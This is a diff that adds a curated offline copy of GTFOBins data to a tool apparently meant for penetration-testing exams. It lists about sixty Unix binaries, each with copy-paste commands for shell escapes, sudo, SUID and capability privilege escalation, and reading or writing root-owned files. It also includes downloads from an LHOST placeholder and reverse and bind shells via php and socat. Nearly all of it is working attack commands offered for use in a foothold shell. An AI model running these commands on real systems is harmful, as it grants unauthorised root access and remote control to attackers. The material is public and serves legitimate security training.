@@ -1,0 +1,323 @@
+# Curated offline GTFOBins reference — Unix binaries that can be abused to break out of a restricted
+# environment, escalate via sudo/SUID/capabilities, or read/write files as another user. Vendored so
+# the lookup works offline (exam-safe); it's a REFERENCE only (Nabu never runs these — you copy the
+# one you need into your foothold shell). Attribution: techniques are the public GTFOBins project
+# (https://gtfobins.github.io/ · CC-BY-3.0-ish community data); each binary links to its page.
+#
+# function keys: shell · command · sudo · suid · capabilities · file-read · file-write · file-upload ·
+# file-download · reverse-shell · bind-shell · library-load · limited-suid. {cmd} is the copy-paste
+# line; for sudo/suid it already includes sudo/the -p trick. Swap paths/targets for real values.
+
+- bin: bash
+  functions:
+    - {func: shell, code: "bash"}
+    - {func: sudo, code: "sudo bash"}
+    - {func: suid, code: "bash -p"}
+
+- bin: sh
+  functions:
+    - {func: shell, code: "sh"}
+    - {func: sudo, code: "sudo sh"}
+
+- bin: find
+  functions:
+    - {func: shell, code: "find . -exec /bin/sh \\; -quit"}
+    - {func: sudo, code: "sudo find . -exec /bin/sh \\; -quit"}
+    - {func: suid, code: "find . -exec /bin/sh -p \\; -quit"}
+    - {func: capabilities, code: "find . -exec /bin/sh -p \\; -quit  # with cap_setuid+ep"}
+
+- bin: vim
+  functions:
+    - {func: shell, code: "vim -c ':!/bin/sh'"}
+    - {func: sudo, code: "sudo vim -c ':!/bin/sh'"}
+    - {func: suid, code: "vim -c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"}
+    - {func: file-write, code: "vim file.txt  # then :w /path/as/root"}
+    - {func: capabilities, code: "vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\",\"sh\",\"-c\",\"reset; exec sh\")'"}
+
+- bin: vi
+  functions:
+    - {func: shell, code: "vi -c ':!/bin/sh'"}
+    - {func: sudo, code: "sudo vi -c ':!/bin/sh'"}
+
+- bin: nano
+  functions:
+    - {func: sudo, code: "sudo nano  # ^R^X then: reset; sh 1>&0 2>&0"}
+    - {func: file-write, code: "nano  # ^O to write any path you can reach"}
+
+- bin: less
+  functions:
+    - {func: shell, code: "less /etc/profile  # then !/bin/sh"}
+    - {func: sudo, code: "sudo less /etc/profile  # then !/bin/sh"}
+    - {func: file-read, code: "less /path/to/file  # reads as the invoking (root) user"}
+
+- bin: more
+  functions:
+    - {func: sudo, code: "TERM= sudo more /etc/profile  # then !/bin/sh"}
+    - {func: file-read, code: "more /path/to/file"}
+
+- bin: man
+  functions:
+    - {func: sudo, code: "sudo man man  # then !/bin/sh"}
+
+- bin: awk
+  functions:
+    - {func: shell, code: "awk 'BEGIN {system(\"/bin/sh\")}'"}
+    - {func: sudo, code: "sudo awk 'BEGIN {system(\"/bin/sh\")}'"}
+    - {func: file-read, code: "awk '//' /path/to/file"}
+    - {func: file-write, code: "LFILE=file; awk 'BEGIN{print \"DATA\">ENVIRON[\"LFILE\"]}'"}
+
+- bin: sed
+  functions:
+    - {func: shell, code: "sed -n '1e exec sh 1>&0' /etc/hosts"}
+    - {func: sudo, code: "sudo sed -n '1e exec sh 1>&0' /etc/hosts"}
+    - {func: file-read, code: "sed '' /path/to/file"}
+
+- bin: ed
+  functions:
+    - {func: shell, code: "ed  # then: !/bin/sh"}
+    - {func: sudo, code: "sudo ed  # then: !/bin/sh"}
+
+- bin: python
+  functions:
+    - {func: shell, code: "python3 -c 'import os; os.system(\"/bin/sh\")'"}
+    - {func: sudo, code: "sudo python3 -c 'import os; os.system(\"/bin/sh\")'"}
+    - {func: suid, code: "python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"}
+    - {func: capabilities, code: "python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'  # cap_setuid+ep"}
+
+- bin: perl
+  functions:
+    - {func: shell, code: "perl -e 'exec \"/bin/sh\";'"}
+    - {func: sudo, code: "sudo perl -e 'exec \"/bin/sh\";'"}
+    - {func: suid, code: "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"}
+    - {func: capabilities, code: "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'  # cap_setuid+ep"}
+
+- bin: ruby
+  functions:
+    - {func: shell, code: "ruby -e 'exec \"/bin/sh\"'"}
+    - {func: sudo, code: "sudo ruby -e 'exec \"/bin/sh\"'"}
+
+- bin: php
+  functions:
+    - {func: shell, code: "php -r 'system(\"/bin/sh\");'"}
+    - {func: sudo, code: "sudo php -r 'system(\"/bin/sh\");'"}
+    - {func: reverse-shell, code: "php -r '$s=fsockopen(\"LHOST\",LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"}
+
+- bin: lua
+  functions:
+    - {func: shell, code: "lua -e 'os.execute(\"/bin/sh\")'"}
+    - {func: sudo, code: "sudo lua -e 'os.execute(\"/bin/sh\")'"}
+
+- bin: node
+  functions:
+    - {func: shell, code: "node -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'"}
+    - {func: sudo, code: "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'"}
+
+- bin: tar
+  functions:
+    - {func: shell, code: "tar xf /dev/null -I '/bin/sh -c \"sh <&2 1>&2\"'"}
+    - {func: sudo, code: "sudo tar xf /dev/null -I '/bin/sh -c \"sh <&2 1>&2\"'"}
+    - {func: suid, code: "tar xf /dev/null -I '/bin/sh -c \"sh <&2 1>&2 -p\"'"}
+
+- bin: zip
+  functions:
+    - {func: shell, code: "TF=$(mktemp -u); zip $TF /etc/hosts -T -TT 'sh #'; rm $TF"}
+    - {func: sudo, code: "TF=$(mktemp -u); sudo zip $TF /etc/hosts -T -TT 'sh #'; rm $TF"}
+
+- bin: git
+  functions:
+    - {func: shell, code: "git help config  # then !/bin/sh (uses the pager)"}
+    - {func: sudo, code: "sudo git -p help config  # then !/bin/sh"}
+    - {func: sudo, code: "sudo git '-c' 'core.pager=/bin/sh' -p help"}
+
+- bin: nmap
+  functions:
+    - {func: shell, code: "TF=$(mktemp); echo 'os.execute(\"/bin/sh\")' > $TF; nmap --script=$TF"}
+    - {func: sudo, code: "TF=$(mktemp); echo 'os.execute(\"/bin/sh\")' > $TF; sudo nmap --script=$TF"}
+    - {func: shell, code: "nmap --interactive  # legacy builds only: then !sh"}
+
+- bin: ftp
+  functions:
+    - {func: shell, code: "ftp  # then: !/bin/sh"}
+    - {func: sudo, code: "sudo ftp  # then: !/bin/sh"}
+
+- bin: gdb
+  functions:
+    - {func: shell, code: "gdb -nx -ex '!sh' -ex quit"}
+    - {func: sudo, code: "sudo gdb -nx -ex '!sh' -ex quit"}
+    - {func: suid, code: "gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit"}
+    - {func: capabilities, code: "gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit  # cap_setuid+ep"}
+
+- bin: tcpdump
+  functions:
+    - {func: sudo, code: "COMMAND='id'; TF=$(mktemp); echo \"$COMMAND\" > $TF; chmod +x $TF; sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root"}
+
+- bin: wget
+  functions:
+    - {func: file-write, code: "wget http://LHOST/file -O /path/to/write"}
+    - {func: file-download, code: "wget http://LHOST/file -O out"}
+    - {func: sudo, code: "sudo wget --use-askpass=/bin/sh 0  # runs /bin/sh as root"}
+
+- bin: curl
+  functions:
+    - {func: file-write, code: "curl file://LFILE -o /path/to/write  # or upload with --upload-file"}
+    - {func: file-download, code: "curl http://LHOST/file -o out"}
+
+- bin: scp
+  functions:
+    - {func: shell, code: "TF=$(mktemp); echo 'sh 0<&2 1>&2' > $TF; chmod +x $TF; scp -S $TF x y:"}
+    - {func: sudo, code: "TF=$(mktemp); echo 'sh 0<&2 1>&2' > $TF; chmod +x $TF; sudo scp -S $TF x y:"}
+
+- bin: rsync
+  functions:
+    - {func: shell, code: "rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"}
+    - {func: sudo, code: "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"}
+
+- bin: cp
+  functions:
+    - {func: file-write, code: "cp payload /dest  # sudo cp to overwrite a root-owned file"}
+    - {func: sudo, code: "sudo cp /bin/sh /tmp/rootsh; sudo chmod +s /tmp/rootsh; /tmp/rootsh -p"}
+
+- bin: dd
+  functions:
+    - {func: file-write, code: "echo DATA | sudo dd of=/path/to/write"}
+    - {func: file-read, code: "sudo dd if=/path/to/read"}
+
+- bin: tee
+  functions:
+    - {func: file-write, code: "echo DATA | sudo tee /path/to/write"}
+
+- bin: dpkg
+  functions:
+    - {func: sudo, code: "sudo dpkg -l  # then !/bin/sh (uses the pager)"}
+
+- bin: apt
+  functions:
+    - {func: sudo, code: "sudo apt changelog apt  # then !/bin/sh"}
+    - {func: sudo, code: "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"}
+
+- bin: env
+  functions:
+    - {func: shell, code: "env /bin/sh"}
+    - {func: sudo, code: "sudo env /bin/sh"}
+    - {func: suid, code: "env /bin/sh -p"}
+
+- bin: docker
+  functions:
+    - {func: shell, code: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"}
+    - {func: sudo, code: "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"}
+
+- bin: journalctl
+  functions:
+    - {func: sudo, code: "sudo journalctl  # then !/bin/sh (uses the pager); or set a small window first"}
+
+- bin: systemctl
+  functions:
+    - {func: sudo, code: "sudo systemctl  # then !sh (pager); or write a malicious unit + start it"}
+
+- bin: mount
+  functions:
+    - {func: sudo, code: "sudo mount -o bind /bin/sh /bin/mount; sudo mount  # (context-dependent)"}
+
+- bin: openssl
+  functions:
+    - {func: file-read, code: "openssl enc -in /path/to/read"}
+    - {func: file-write, code: "openssl enc -in payload -out /path/to/write"}
+
+- bin: crontab
+  functions:
+    - {func: sudo, code: "sudo crontab -e  # editor breakout (EDITOR=/bin/sh) or add a root job"}
+
+- bin: screen
+  functions:
+    - {func: suid, code: "screen  # older setuid screen (CVE-2017-5618) -> root"}
+
+- bin: base64
+  functions:
+    - {func: file-read, code: "base64 /path/to/read | base64 -d"}
+
+- bin: xxd
+  functions:
+    - {func: file-read, code: "xxd /path/to/read | xxd -r"}
+    - {func: file-write, code: "echo DATA | xxd | sudo xxd -r - /path/to/write"}
+
+- bin: socat
+  functions:
+    - {func: reverse-shell, code: "socat TCP:LHOST:LPORT EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane"}
+    - {func: bind-shell, code: "socat TCP-LISTEN:LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane"}
+
+- bin: mysql
+  functions:
+    - {func: shell, code: "mysql -e '\\! /bin/sh'"}
+    - {func: sudo, code: "sudo mysql -e '\\! /bin/sh'"}
+
+- bin: sqlite3
+  functions:
+    - {func: shell, code: "sqlite3 /dev/null '.shell /bin/sh'"}
+    - {func: sudo, code: "sudo sqlite3 /dev/null '.shell /bin/sh'"}
+
+- bin: gcc
+  functions:
+    - {func: shell, code: "gcc -wrapper /bin/sh,-s ."}
+    - {func: sudo, code: "sudo gcc -wrapper /bin/sh,-s ."}
+
+- bin: make
+  functions:
+    - {func: shell, code: "COMMAND='/bin/sh'; make -s --eval=$'x:\\n\\t-'\"$COMMAND\""}
+    - {func: sudo, code: "sudo make -s --eval=$'x:\\n\\t-/bin/sh'"}
+
+- bin: expect
+  functions:
+    - {func: shell, code: "expect -c 'spawn /bin/sh; interact'"}
+    - {func: sudo, code: "sudo expect -c 'spawn /bin/sh; interact'"}
+
+- bin: strace
+  functions:
+    - {func: shell, code: "strace -o /dev/null /bin/sh"}
+    - {func: sudo, code: "sudo strace -o /dev/null /bin/sh"}
+
+- bin: flock
+  functions:
+    - {func: sudo, code: "sudo flock -u / /bin/sh"}
+
+- bin: nice
+  functions:
+    - {func: sudo, code: "sudo nice /bin/sh"}
+
+- bin: timeout
+  functions:
+    - {func: sudo, code: "sudo timeout 7d /bin/sh"}
+
+- bin: watch
+  functions:
+    - {func: shell, code: "watch -x sh -c 'reset; exec sh 1>&0 2>&0'"}
+    - {func: sudo, code: "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'"}
+
+- bin: xargs
+  functions:
+    - {func: shell, code: "xargs -a /dev/null sh"}
+    - {func: sudo, code: "sudo xargs -a /dev/null sh"}
+
+- bin: emacs
+  functions:
+    - {func: shell, code: "emacs -Q -nw --eval '(term \"/bin/sh\")'"}
+    - {func: sudo, code: "sudo emacs -Q -nw --eval '(term \"/bin/sh\")'"}
+
+- bin: pip
+  functions:
+    - {func: sudo, code: "TF=$(mktemp -d); echo 'import os; os.execl(\"/bin/sh\",\"sh\")' > $TF/setup.py; sudo pip install $TF"}
+
+- bin: cpulimit
+  functions:
+    - {func: sudo, code: "sudo cpulimit -l 100 -f -- /bin/sh -p"}
+
+- bin: ionice
+  functions:
+    - {func: sudo, code: "sudo ionice /bin/sh"}
+
+- bin: taskset
+  functions:
+    - {func: sudo, code: "sudo taskset 1 /bin/sh"}
+
+- bin: stdbuf
+  functions:
+    - {func: sudo, code: "sudo stdbuf -i0 /bin/sh"}
